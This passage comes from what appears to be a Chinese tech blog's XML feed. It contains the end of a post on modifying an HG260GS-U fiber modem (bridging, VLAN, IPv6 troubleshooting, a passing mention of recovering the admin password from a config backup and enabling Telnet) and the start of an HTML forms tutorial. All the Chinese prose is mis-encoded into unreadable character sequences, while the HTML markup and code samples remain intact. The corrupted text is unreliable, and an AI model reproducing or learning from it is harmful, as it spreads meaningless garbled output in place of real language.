çº¿è·¯ç”±å™¨çš„<strong>LANå£</strong>è€Œä¸æ˜¯WANå£ï¼Œå…³é—­å®ƒçš„ DHCP åŠŸèƒ½ï¼Œç”±å…‰çŒ«ç›´æ¥åˆ†é… IP åœ°å€å°±è¡Œäº†ã€‚</p><p><br><br></p><p>ç„¶è€Œæœ‰ä¸ªå¤§é—®é¢˜ï¼Œå°±æ˜¯æˆ‘çš„ IPv6 æ²¡æœ‰Internetè®¿é—®æƒé™ã€‚æ‰‹åŠ¨é…ç½®äº†DNSä¹Ÿä¸è¡Œã€‚</p><p><code>ping -6 ipv6.baidu.com</code>é€šä¸äº†ã€‚</p><p><code>tracert 240c::6666</code> å‘ç°åˆ°æˆ‘çš„å…‰çŒ«å°±å‡ºä¸å»äº†ã€‚</p><p>è¯•äº†ä¸€ä¸‹åœ¨å…‰çŒ«ä¸Šçš„è¯Šæ–­é‡Œç”¨IPv6è¿›è¡Œpingä¹Ÿæ²¡æœ‰è¿æ¥ã€‚</p><p>ä¸çŸ¥é“å“ªé‡Œè®¾ç½®æœ‰é—®é¢˜äº†ï¼Œå¾ˆæ‡µï¼ˆæ‘Šæ‰‹ã€‚</p><p><strong>æ±‚å¤§ä½¬ä»¬æŒ‡ç‚¹ä¸€ä¸‹ã€‚</strong></p><br><hr><h2 id="0x05-å®½å¸¦æ¡¥æ¥æ”¹é€ "><a href="#0x05-å®½å¸¦æ¡¥æ¥æ”¹é€ " class="headerlink" title="0x05 å®½å¸¦æ¡¥æ¥æ”¹é€ "></a>0x05 å®½å¸¦æ¡¥æ¥æ”¹é€ </h2><p>å‰é¢è¯´æ”¯æŒå¤šæ’­å˜›ï¼Œç„¶åå°±æƒ³åˆ°åˆ©ç”¨å…‰çŒ«æ¡¥æ¥å®½å¸¦ï¼Œç„¶åå†åˆ©ç”¨åé¢çš„è·¯ç”±å™¨ï¼ˆè½¯è·¯ç”±/ç¡¬è·¯ç”±ï¼‰è¿›è¡Œæ‹¨å·ã€‚</p><p>æˆ–è€…æ˜¯è¿™ç§æƒ…å†µï¼Œç½‘ç»œæµé‡è¾ƒå¤§ï¼Œè·¯ç”±è¾ƒå¤æ‚ç­‰å…‰çŒ«éš¾ä»¥æ‰¿å—æˆ–è€…ä¸å¤Ÿç¨³å®šï¼Œä¹Ÿå¯ä»¥è¯•è¯•æ¡¥æ¥çš„æ–¹æ¡ˆã€‚</p><p>æ–¹æ³•ç±»ä¼¼äº <strong>0x04</strong>ã€‚</p><p>å¤§æ¦‚å°±åƒå›¾é‡Œè¿™æ ·å§ã€‚</p><p>å‹¾é€‰<strong>å¯ç”¨Vlan</strong>ï¼Œ<code>VLAN ID</code> ä¹Ÿå’Œä¹‹å‰é…ç½®<code>INTERNET</code>çš„ä¸€æ ·ã€‚</p><p><strong>ç»‘å®šç«¯å£å»ºè®®é€‰ç«¯å£1</strong>ï¼Œæ¯•ç«Ÿæ˜¯åƒå…†å£å˜›ï¼</p><p><img src="/2020/02/27/Server_OpticalModem/bridge.png" alt="æ¡¥æ¥è®¾ç½®"></p><p>ä¹‹åå°±å¯ä»¥ç›´æ¥é€šè¿‡ LAN1 è¿æ¥è·¯ç”±å™¨æˆ–è€…ç”µè„‘è¿›è¡Œæ‹¨å·äº†ã€‚</p><p>æ‹¨å·åä¹Ÿä¼šåˆ†é…å…¬ç½‘çš„ IPv6 åœ°å€ã€‚<em>ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œçš„ IPv6 è¿˜æ˜¯æ²¡æœ‰Internetè®¿é—®æƒé™ï¼Œä¼°è®¡æ˜¯è¿è¥å•†çš„é—®é¢˜å§</em></p><p>ï¼ˆå‡è£…è¿™é‡Œæœ‰æˆªå›¾ï¼‰</p><p>å½“ç„¶ï¼Œè¦å®ç°æ¡¥æ¥æ”¹é€ ï¼Œä½ è¿˜å¯ä»¥å°è¯•<strong>ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶</strong>çš„æ–¹æ¡ˆ<em>ï¼ˆè¶…ç¡¬æ ¸ï¼‰</em>ï¼Œå…·ä½“è¯·å‚è€ƒ<a href="https://guanggai.org/thread-459-1-1.html">è¿™é‡Œ</a>ã€‚</p><br><hr><h2 id="0x06-å…¶ä»–ç©æ„"><a href="#0x06-å…¶ä»–ç©æ„" class="headerlink" title="0x06 å…¶ä»–ç©æ„"></a>0x06 å…¶ä»–ç©æ„</h2><p>æœ‰æ¬¡åœ¨è®¿é—®ä¸€ä¸ªå…‰çŒ«çš„é¡µé¢æ—¶è¾“é”™äº†ç½‘å€ï¼Œæ­£å¥½å‘ç°äº†å…‰çŒ«ç”¨çš„ HTTP Server æ˜¯ micro_httpdã€‚</p><p>å‘ç°æŒ‡å‘çš„ç½‘ç«™è¿˜èƒ½è®¿é—®ã€‚è¿™æ˜¯ä¸ªè½»é‡çº§çš„æœåŠ¡å™¨äº†ï¼Œæ­£å¥½ä¹Ÿé€‚åˆåœ¨è¿™ç§å°è®¾å¤‡ä¸Šè·‘äº†ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/404NotFound.png" alt="404"></p><p><img src="/2020/02/27/Server_OpticalModem/acme.png" alt="micro_httpd"></p><p>è¿™ä¸ªå…‰çŒ«è¿˜æ”¯æŒè¿œç¨‹ä¸‹è½½ï¼Œå¯ä»¥é€šè¿‡ USB è¿æ¥å¤–éƒ¨è®¾å¤‡ï¼Œå¼€å¯ FTP æœåŠ¡å™¨è¿›è¡Œè®¿é—®ã€‚</p><p>ä¸è¿‡æ„Ÿè§‰è¿™ä¸ª USB åº”è¯¥ä¹Ÿæ˜¯2.0çš„ï¼Œå‹‰å¼ºç”¨ç”¨è¿˜å¯ä»¥å§ï¼Œä¹Ÿæ²¡å°è¯•è¿‡233.</p><br><hr><h2 id="0x07-å°ç»“"><a href="#0x07-å°ç»“" class="headerlink" title="0x07 å°ç»“"></a>0x07 å°ç»“</h2><p>æŠ˜è…¾äº†å¥½ä¹…è¿™ä¸ªæœ‰ç‚¹å¤è€çš„å…‰çŒ« emmmå˜¤å˜¤å˜¤</p><p>äºæ˜¯ä¹æœ¬æ–‡ä»‹ç»çš„å†…å®¹åŒ…æ‹¬ï¼š</p><p>é€šè¿‡é…ç½®å¤‡ä»½æ–‡ä»¶è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œå¼€å¯ Telnet ç®¡ç†ï¼Œå¯ç”¨ IPv6ï¼Œå®½å¸¦æ¡¥æ¥çš„æ”¹é€ ç­‰ç­‰ã€‚</p><p><em>æ˜¯æ—¶å€™æ¢ä¸ªè·¯ç”±å™¨äº†ï¼Œåªæœ‰å¤§æ¦‚1/3çš„ç½‘é€Ÿå¤ªäºäº†ï¼</em></p><p>æ€ä¹ˆè¯´å¥½å‘¢ï¼Œæ„Ÿè§‰å…¶å®å¹¶æ²¡æœ‰å¹²ä»€ä¹ˆæ­£äº‹çš„äºšå­ã€‚ã€‚ã€‚</p><p>ç­‰æˆ‘å­¦å®Œé€šä¿¡ç½‘ç»œï¼ˆè®¡ç®—æœºç½‘ç»œï¼‰è¯´ä¸å®šä¼šæœ‰æ›´æ·±å…¥çš„ç†è§£å§233333.</p><p><strong>æ¬¢è¿å¤§ä½¬ä»¬æ¥äº¤æµäº¤æµå‘¢ï¼</strong></p><p>è¿˜æœ‰ï¼Œä»¥ä¸Šå†…å®¹<strong>ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼Œç¦æ­¢å•†ç”¨ã€‚</strong></p><p><strong>è½¬è½½è®°å¾—æ³¨æ˜å‡ºå¤„å‘€ï¼</strong></p><p>æºœäº†æºœäº†ï¼ˆ</p><br><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://bbs.mydigit.cn/read.php?tid=1827084">HG260GS-Uå…‰çŒ«æ‹†è§£ä¸ç™»å½•è§£ç </a></p><p><a href="http://dragonbest520.com/2018/03/04/%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9a%e5%85%89%e5%ae%bd%e5%b8%a6%e5%8f%8aiptv%e6%8a%98%e8%85%be%e7%ac%94%e8%ae%b0%ef%bc%88%e4%ba%8c%ef%bc%89-%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9ahg260gs-u-wo-37/">åŒ—äº¬è”é€šå…‰å®½å¸¦åŠIPTVæŠ˜è…¾ç¬”è®°ï¼ˆäºŒï¼‰â€“åŒ—äº¬è”é€šHG260GS-U WO-37å¼€å¯è¶…çº§ç®¡ç†å‘˜çš„æ–¹æ³•</a></p><p><a href="https://www.bilibili.com/video/av45203145">è½»æ¾å¼€å¯ä¸­å›½ç§»åŠ¨IPV6è¿æ¥ï¼Œæ—©å…¥ç•…æ¸¸ipv6ä¸–ç•Œ</a></p><p><a href="https://guanggai.org/thread-459-1-1.html">çƒ½ç«HG220G-U 2.03+ / HG2201U 5.0+å…‰çŒ«æ”¹æ¡¥æ¥æ•™ç¨‹</a></p><p>etc.</p><p><em>ï¼ˆå¤§éƒ¨åˆ†éƒ½å¥½å¤è€äº†</em></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Web </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> IPv6 </tag>
            
            <tag> Modem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML è¿›é˜¶å­¦ä¹ ç¬”è®°</title>
      <link href="2020/02/18/FrontEnd_HTML_Advanced/"/>
      <url>2020/02/18/FrontEnd_HTML_Advanced/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰å‡ å¤©è¿‡äº†ä¸€éåŸºç¡€çš„ HTML çŸ¥è¯†ï¼Œè®°äº†ç‚¹<a href="https://miaotony.xyz/2020/02/14/FrontEnd_HTML_Basic/">ç¬”è®°åœ¨è¿™é‡Œ</a>ã€‚</p><p>æ€»ä½“æ„Ÿè§‰ HTML æœç„¶æ˜¯ä¸€é—¨<strong>æ ‡è®°è¯­è¨€</strong>ï¼Œå…¶å®å®ƒå°±æ˜¯å°†è¦å±•ç¤ºç»™ç”¨æˆ·çš„å„ç§å…ƒç´ åˆ©ç”¨å¸¦æœ‰ <code>&lt;</code> <code>&gt;</code> çš„æ ‡ç­¾æ ‡è®°å¥½ï¼Œæµè§ˆå™¨å†æ ¹æ®ä¸åŒçš„æ ‡ç­¾æ¸²æŸ“å‡ºä¸åŒçš„æ•ˆæœï¼Œå‘ˆç°ç»™ç”¨æˆ·ã€‚</p><p>HTML å¯ä»¥è¯´æ˜¯æ­äº†ä¸€ä¸ªæ¡†æ¶ï¼Œè€Œ CSS åˆ™æ˜¯æŠŠç½‘é¡µåŠ ä»¥æ‰“æ‰®ï¼Œä½¿å…¶å˜å¾—ç¾è§‚ï¼ŒJavaScript åˆ™æä¾›å’Œæ‹“å±•äº†ç½‘ç«™ä¸ç”¨æˆ·ä¹‹é—´çš„äº¤äº’åŠŸèƒ½ã€‚</p><p>è¿™å›å°±æ¥å­¦ä¸€å­¦HTMLä¸­<strong>è¿›é˜¶</strong>çš„å†…å®¹å§ã€‚ï¼ˆå…¶å®ä¹Ÿä¸ç®—è¿›é˜¶8</p><p>ç»§ç»­ä¸»è¦å‚è€ƒ W3School çš„æ•™ç¨‹å§ï¼Œä¹Ÿç»“åˆä¸€ç‚¹è‡ªå·±çš„å°ä½“ä¼šã€‚</p><p><strong>ç”±äºåšå®¢è‡ªå¸¦äº†ä¸€äº› CSS æ ·å¼ï¼Œå¯èƒ½æœ‰äº›æ˜¾ç¤ºæ•ˆæœæœ‰æ‰€ä¸åŒã€‚</strong></p><br><h2 id="è¡¨å•ç®€ä»‹"><a href="#è¡¨å•ç®€ä»‹" class="headerlink" title="è¡¨å•ç®€ä»‹"></a>è¡¨å•ç®€ä»‹</h2><p>ç”¨äºæ”¶é›†ç”¨æˆ·çš„è¾“å…¥ã€‚</p><h3 id="form-å…ƒç´ "><a href="#form-å…ƒç´ " class="headerlink" title="form å…ƒç´ "></a>form å…ƒç´ </h3><p><code>&lt;form&gt;</code> å…ƒç´ ç”¨æ¥å®šä¹‰ HTML è¡¨å•ã€‚</p><p>æ¡†æ¶æ˜¯è¿™æ ·</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- ...form elementsï¼ˆè¡¨å•å…ƒç´ ï¼‰ ...  --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="Action-å±æ€§"><a href="#Action-å±æ€§" class="headerlink" title="Action å±æ€§"></a>Action å±æ€§</h4><p><em><code>action</code> å±æ€§</em>å®šä¹‰åœ¨æäº¤è¡¨å•æ—¶æ‰§è¡Œçš„åŠ¨ä½œã€‚å‘æœåŠ¡å™¨æäº¤è¡¨å•çš„é€šå¸¸åšæ³•æ˜¯ä½¿ç”¨æäº¤æŒ‰é’®ï¼ˆåé¢å†è¯´ï¼‰ã€‚</p><p>åˆ©ç”¨ <code>action</code> æŒ‡å®šå°†ä¿¡æ¯å‘é€åˆ°æœåŠ¡å™¨çš„è·¯å¾„ã€‚</p><p>æ¯”å¦‚æŒ‡å®š <code>miao.php</code> è¿™ä¸ªPHPè„šæœ¬æ¥å¤„ç†æäº¤çš„æ•°æ®ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>RESTful API çš„è¯ï¼Œé€šå¸¸æ˜¯æŒ‡å®šæŸä¸ªè·¯å¾„ï¼Œå¦‚ <code>/api/user</code>ï¼Œé€šè¿‡ HTTP çš„ä¸åŒæ–¹æ³•è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</p><p>å¦‚æœçœç•¥ <code>action</code> å±æ€§ï¼Œåˆ™ <code>action</code> ä¼šè¢«è®¾ç½®ä¸ºå½“å‰é¡µé¢ã€‚</p><h4 id="Method-å±æ€§"><a href="#Method-å±æ€§" class="headerlink" title="Method å±æ€§"></a>Method å±æ€§</h4><p><em><code>method</code> å±æ€§</em>è§„å®šåœ¨æäº¤è¡¨å•æ—¶æ‰€ç”¨çš„ HTTP æ–¹æ³•ï¼ˆ<em>GET</em> æˆ– <em>POST</em>ï¼‰ã€‚</p><p>çœç•¥çš„è¯é»˜è®¤ä¸º GET æ–¹æ³•ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>GET é€‚åˆå°‘é‡æ•°æ®çš„æäº¤ï¼ˆæµè§ˆå™¨å’ŒæœåŠ¡å™¨å¯¹URLé•¿åº¦æœ‰é™åˆ¶ï¼‰ï¼Œæ•°æ®ä¼šä»¥ urlencode çš„å½¢å¼å‡ºç°åœ¨ URL çš„å‚æ•°ä¸­ï¼Œé€‚åˆéæ•æ„Ÿä¿¡æ¯ã€‚</p><p>POST é€‚åˆå¤§é‡æ•°æ®çš„æäº¤ï¼Œä¸”æ›´æœ‰å®‰å…¨æ€§ï¼Œæ•°æ®åœ¨ body ä¸­æäº¤ï¼Œä¸ä¼šå‡ºç°åœ¨URLä¸­ï¼Œé€‚åˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚å¯†ç ï¼‰ç­‰æƒ…å†µã€‚</p><p>ä¸è¿‡äºŒè€…æœ¬è´¨ä¸Šæ²¡æœ‰æ˜æ˜¾çš„å·®åˆ«ï¼Œå…¶å®æ˜¯åœ¨æ ‡å‡†åˆ¶å®šä¸Šæœ‰æ‰€ä¸åŒè€Œå·²ã€‚</p><h4 id="Name-å±æ€§"><a href="#Name-å±æ€§" class="headerlink" title="Name å±æ€§"></a>Name å±æ€§</h4><p>å¦‚æœè¦æ­£ç¡®åœ°è¢«æäº¤ï¼Œ<strong>æ¯ä¸ªè¾“å…¥å­—æ®µå¿…é¡»è®¾ç½®ä¸€ä¸ª <code>name</code> å±æ€§</strong>ã€‚</p><p>è‹¥ä¸å«<code>name</code>å±æ€§ï¼Œåˆ™ä¸ä¼šå‘æœåŠ¡å™¨æäº¤è¿™ä¸€é¡¹å†…å®¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action="#">    First name:<br>    <input type="text" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><p>ï¼ˆè¿™ä¸ªæäº¤ä¸ä¼šæœ‰ååº”çš„å•¦</p><h4 id="form-å…ƒç´ çš„å®Œæ•´å±æ€§"><a href="#form-å…ƒç´ çš„å®Œæ•´å±æ€§" class="headerlink" title="form å…ƒç´ çš„å®Œæ•´å±æ€§"></a>form å…ƒç´ çš„å®Œæ•´å±æ€§</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">accept-charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token attr-name">ectype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>application/x-www-form-urlencoded<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span> <span class="token attr-name">novalidate</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- ...form elementsï¼ˆè¡¨å•å…ƒç´ ï¼‰ ...  --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><table><thead><tr><th>å±æ€§</th><th>æè¿°</th></tr></thead><tbody><tr><td>accept-charset</td><td>è§„å®šåœ¨è¢«æäº¤è¡¨å•ä¸­ä½¿ç”¨çš„å­—ç¬¦é›†ï¼ˆé»˜è®¤ï¼šé¡µé¢å­—ç¬¦é›†ï¼‰ã€‚</td></tr><tr><td>action</td><td>è§„å®šå‘ä½•å¤„æäº¤è¡¨å•çš„åœ°å€ï¼ˆURLï¼‰ï¼ˆæäº¤é¡µé¢ï¼‰ã€‚</td></tr><tr><td>autocomplete</td><td>è§„å®šæµè§ˆå™¨åº”è¯¥è‡ªåŠ¨å®Œæˆè¡¨å•ï¼ˆé»˜è®¤ï¼šå¼€å¯<code>on</code>ï¼‰ã€‚</td></tr><tr><td>enctype</td><td>è§„å®šè¢«æäº¤æ•°æ®çš„ç¼–ç ï¼ˆé»˜è®¤ï¼š<code>url-encoded</code>ï¼‰ã€‚</td></tr><tr><td>method</td><td>è§„å®šåœ¨æäº¤è¡¨å•æ—¶æ‰€ç”¨çš„ HTTP æ–¹æ³•ï¼ˆé»˜è®¤ï¼šGETï¼‰ã€‚</td></tr><tr><td>name</td><td>è§„å®šè¯†åˆ«è¡¨å•çš„åç§°ï¼ˆå¯¹äº DOM ä½¿ç”¨ï¼šdocument.forms.nameï¼‰ã€‚</td></tr><tr><td>novalidate</td><td>è§„å®šæµè§ˆå™¨ä¸éªŒè¯è¡¨å•ã€‚</td></tr><tr><td>target</td><td>è§„å®š action å±æ€§ä¸­åœ°å€çš„ç›®æ ‡ï¼ˆé»˜è®¤ï¼š<code>_self</code>ï¼‰ã€‚</td></tr></tbody></table><hr><h3 id="ç”¨-fieldset-ç»„åˆè¡¨å•æ•°æ®"><a href="#ç”¨-fieldset-ç»„åˆè¡¨å•æ•°æ®" class="headerlink" title="ç”¨ fieldset ç»„åˆè¡¨å•æ•°æ®"></a>ç”¨ fieldset ç»„åˆè¡¨å•æ•°æ®</h3><p><code>&lt;fieldset&gt;</code> å…ƒç´ ç»„åˆè¡¨å•ä¸­çš„ç›¸å…³æ•°æ®ã€‚</p><p><code>&lt;legend&gt;</code> å…ƒç´ ä¸º <code>&lt;fieldset&gt;</code> å…ƒç´ å®šä¹‰æ ‡é¢˜ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>legend</span><span class="token punctuation">&gt;</span></span>Personal information:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>legend</span><span class="token punctuation">&gt;</span></span>        First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/fieldset.png" alt="fieldset"></p><hr><h2 id="è¡¨å•å…ƒç´ "><a href="#è¡¨å•å…ƒç´ " class="headerlink" title="è¡¨å•å…ƒç´ "></a>è¡¨å•å…ƒç´ </h2><p><strong>è¡¨å•å…ƒç´ </strong>æŒ‡çš„æ˜¯ä¸åŒç±»å‹çš„ <strong>input å…ƒç´ </strong>ã€<strong>å¤é€‰æ¡†</strong>ã€<strong>å•é€‰æŒ‰é’®</strong>ã€<strong>æäº¤æŒ‰é’®</strong>ç­‰ç­‰ã€‚</p><h3 id="input-å…ƒç´ "><a href="#input-å…ƒç´ " class="headerlink" title="input å…ƒç´ "></a>input å…ƒç´ </h3><p>æœ€é‡è¦çš„<strong>è¡¨å•å…ƒç´ </strong>ã€‚å®ƒæœ‰å¾ˆå¤šä¸åŒçš„ <em>type</em> å±æ€§ï¼Œæ¯”å¦‚ï¼š</p><table><thead><tr><th>ç±»å‹type</th><th>æè¿°</th></tr></thead><tbody><tr><td>text</td><td>å®šä¹‰å¸¸è§„æ–‡æœ¬è¾“å…¥ã€‚</td></tr><tr><td>radio</td><td>å®šä¹‰å•é€‰æŒ‰é’®è¾“å…¥ï¼ˆé€‰æ‹©å¤šä¸ªé€‰æ‹©ä¹‹ä¸€ï¼‰</td></tr><tr><td>submit</td><td>å®šä¹‰æäº¤æŒ‰é’®ï¼ˆæäº¤è¡¨å•ï¼‰</td></tr><tr><td>â€¦â€¦</td><td>â€¦â€¦</td></tr></tbody></table><h4 id="æ–‡æœ¬è¾“å…¥textã€å¯†ç è¾“å…¥password"><a href="#æ–‡æœ¬è¾“å…¥textã€å¯†ç è¾“å…¥password" class="headerlink" title="æ–‡æœ¬è¾“å…¥textã€å¯†ç è¾“å…¥password"></a>æ–‡æœ¬è¾“å…¥textã€å¯†ç è¾“å…¥password</h4><p><code>&lt;input type="text"&gt;</code> å®šä¹‰ç”¨äº<strong>æ–‡æœ¬è¾“å…¥</strong>çš„å•è¡Œè¾“å…¥å­—æ®µã€‚</p><p><code>&lt;input type="password"&gt;</code> å®šä¹‰<strong>å¯†ç å­—æ®µ</strong>ã€‚</p><p><strong>è¡¨å•æœ¬èº«å¹¶ä¸å¯è§ã€‚</strong>æ–‡æœ¬å­—æ®µçš„<strong>é»˜è®¤å®½åº¦æ˜¯ 20 ä¸ªå­—ç¬¦</strong>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>    Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token 